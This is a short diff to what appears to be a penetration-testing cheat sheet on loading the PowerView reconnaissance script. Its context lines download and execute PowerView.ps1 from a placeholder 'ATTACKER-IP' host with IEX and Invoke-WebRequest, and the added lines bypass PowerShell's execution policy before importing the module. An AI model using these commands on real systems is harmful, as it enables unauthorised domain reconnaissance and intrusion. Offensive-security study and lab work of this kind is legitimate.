@@ -44,6 +44,14 @@ IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER-IP/PowerView.ps1'
 Invoke-WebRequest -Uri http://ATTACKER-IP/PowerView.ps1 -OutFile PowerView.ps1
 ```
 
+**Bypass execution policy (current session only)**
+
+```powershell
+powershell -ep bypass
+```
+
+**Import Module**
+
 ```powershell
 Import-Module .\PowerView.ps1
 ```
